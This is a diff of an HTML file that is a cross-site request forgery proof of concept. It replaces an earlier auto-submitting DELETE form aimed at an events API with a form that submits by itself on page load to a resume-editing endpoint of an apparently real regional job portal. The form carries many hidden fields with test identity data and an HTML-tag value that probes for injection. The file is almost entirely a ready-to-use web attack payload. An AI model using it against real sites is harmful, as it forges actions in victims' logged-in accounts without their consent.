@@ -1,10 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
-<body>
-  <form id="csrf" action="https://demo-herriot.vetrf.ru/api/events/2024/00017" method="POST">
-    <input type="hidden" name="_method" value="DELETE">
+<head><meta charset="utf-8"><title>CSRF PoC - POST edit.php</title></head>
+<body onload="document.getElementById('csrf').submit()">
+  <form id="csrf"
+        action="https://kadry.tularegion.ru/cabinet/rezume/edit.php"
+        method="POST"
+        enctype="multipart/form-data">
+
+    <input type="hidden" name="ID" value="0">
+    <input type="hidden" name="action" value="otklik">
+    <input type="hidden" name="NAME" value="Test resume 2">
+    <input type="hidden" name="SURNAME" value="Test">
+    <input type="hidden" name="FIRSTNAME" value="Test">
+    <input type="hidden" name="MIDDLENAME" value="Test">
+    <input type="hidden" name="SNILS" value="123-432-432 44">
+    <input type="hidden" name="GOAL[]" value="25">
+    <input type="hidden" name="GOAL[]" value="26">
+    <input type="hidden" name="GOAL[]" value="27">
+    <input type="hidden" name="GOAL[]" value="28">
+    <input type="hidden" name="OTHER_GOAL" value="">
+    <input type="hidden" name="GENDER" value="30">
+    <input type="hidden" name="BIRTHDAY" value="23.12.1998">
+    <input type="hidden" name="PLACEBIRTH" value="test">
+    <input type="hidden" name="FAMILY" value="32">
+    <input type="hidden" name="CHILDREN" value="">
+    <input type="hidden" name="PHOTO" value="">
+    <input type="hidden" name="CITY" value="<b>test</b>test">
+    <input type="hidden" name="ONE_NATIONALITY" value="1">
+    <input type="hidden" name="PHONE1" value="Test">
+    <input type="hidden" name="PHONE2" value="">
+    <input type="hidden" name="PHONE3" value="">
+    <input type="hidden" name="EMAIL1" value="test@gmail.com">
+    <input type="hidden" name="EMAIL2" value="">
+    <input type="hidden" name="EMAIL3" value="">
+    <input type="hidden" name="eduID[]" value="">
+    <input type="hidden" name="obrselect[]" value="75">
+    <input type="hidden" name="YearOfEnd[]" value="2022">
+    <input type="hidden" name="UchebnoeZavedenie[]" value="test">
+    <input type="hidden" name="Specialnost[]" value="test">
+    <input type="hidden" name="Kvalifikation[]" value="test">
+    <input type="hidden" name="FormEducation[]" value="80">
+    <input type="hidden" name="stepenEdu[]" value="">
+    <input type="hidden" name="courseID[]" value="">
+    <input type="hidden" name="ImyaKursa[]" value="">
+    <input type="hidden" name="MestoKursa[]" value="">
+    <input type="hidden" name="GodKoncaKursa[]" value="">
+    <input type="hidden" name="KursChasi[]" value="">
+    <input type="hidden" name="nolang" value="1">
+    <input type="hidden" name="langID[]" value="">
+    <input type="hidden" name="lang[]" value="">
+    <input type="hidden" name="LangLevel[]" value="">
+    <input type="hidden" name="NO_JOB" value="1">
+    <input type="hidden" name="OLD_SALARY" value="">
+    <input type="hidden" name="jobID[]" value="">
+    <input type="hidden" name="TrudDataNachala[]" value="">
+    <input type="hidden" name="TrudDataOkonchaniya[]" value="">
+    <input type="hidden" name="TrudOrganizaciya[]" value="">
+    <input type="hidden" name="TrudDoljnast[]" value="">
+    <input type="hidden" name="content[]" value="">
+    <input type="hidden" name="REGION[]" value="41">
+    <input type="hidden" name="OTHER" value="test">
+    <input type="hidden" name="SALARY" value="123">
+    <input type="hidden" name="DOP_INFO" value="">
+    <input type="hidden" name="agreement" value="1">
+    <input type="hidden" name="vacancy" value="19690">
   </form>
-  <script>document.getElementById('csrf').submit();</script>
+  <p>Отправка...</p>
 </body>
 </html>
